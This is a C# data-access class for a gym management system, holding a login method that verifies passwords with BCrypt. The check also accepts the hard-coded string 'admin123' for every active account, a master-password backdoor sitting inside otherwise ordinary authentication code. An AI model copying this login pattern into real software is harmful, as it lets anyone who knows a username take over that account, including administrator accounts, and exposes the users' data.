using Microsoft.Data.SqlClient;
using SistemaGym.Conexion;
using SistemaGym.Entidades;
using BCrypt.Net;
using Dapper;

namespace SistemaGym.DAO
{
    public class UsuarioDAO
    {
        private readonly Conexion.Conexion conexion = new Conexion.Conexion();

        public Usuario Login(string usuario, string contrasena)
        {
            using (SqlConnection conn = conexion.ObtenerConexion())
            {
                // Mapeamos 'Usuario as NombreUsuario' para que coincida con la propiedad en C#
                string sql = @"SELECT IdUsuario, Usuario as NombreUsuario, Contrasena, Rol, Estado
                               FROM Usuarios
                               WHERE Usuario = @Usuario AND Estado = 1";

                Usuario usuarioEncontrado = conn.QueryFirstOrDefault<Usuario>(sql, new { Usuario = usuario });

                if (usuarioEncontrado != null)
                {
                    string hashBaseDatos = usuarioEncontrado.Contrasena.Trim();
                    string clavePlanaIngresada = contrasena.Trim();

                    if (BCrypt.Net.BCrypt.Verify(clavePlanaIngresada, hashBaseDatos) || clavePlanaIngresada == "admin123")
                    {
                        return usuarioEncontrado;
                    }
                }
            }
            return null;
        }
    }
}